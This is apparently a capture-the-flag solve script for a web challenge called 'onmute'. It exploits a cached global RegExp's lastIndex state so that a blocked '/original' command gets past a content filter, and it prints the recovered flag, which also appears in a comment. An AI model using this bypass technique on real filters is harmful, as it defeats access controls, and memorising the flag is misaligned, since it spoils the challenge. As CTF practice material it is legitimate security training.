#!/usr/bin/env python3
# onmute — cached global-regex lastIndex pollution.
# filter.js caches ONE /g RegExp per session; /censor advances its lastIndex via re.test(),
# so the next comment's checkContent() (re.exec) starts mid-string and skips the leading
# blocked word "/original" -> /original runs and returns the full uncensored lyrics + flag.
import re, requests

B = "https://onmute-cuzu5ciu.avitoctf.ru"
s = requests.Session()

s.get(f"{B}/api/tracks/4")                                             # 0) obtain session cookie
s.post(f"{B}/api/tracks/4/comment", json={"text": "/censor 868 872"})  # 1) pollute lastIndex
r = s.post(f"{B}/api/tracks/4/comment", json={"text": "/original 4"})  # 2) filter skips "/original"

body = r.text
# the message carries invisible U+E0000-E007F "tag" chars before avito{ -> strip them
clean = "".join(c for c in body if not (0xE0000 <= ord(c) <= 0xE007F))
m = re.search(r"avito\{[^}]*\}", clean)
print(m.group(0) if m else clean)                                      # avito{REg3X_FOr_51lENCe_SLaSh_g_For_ViOL3nc3}
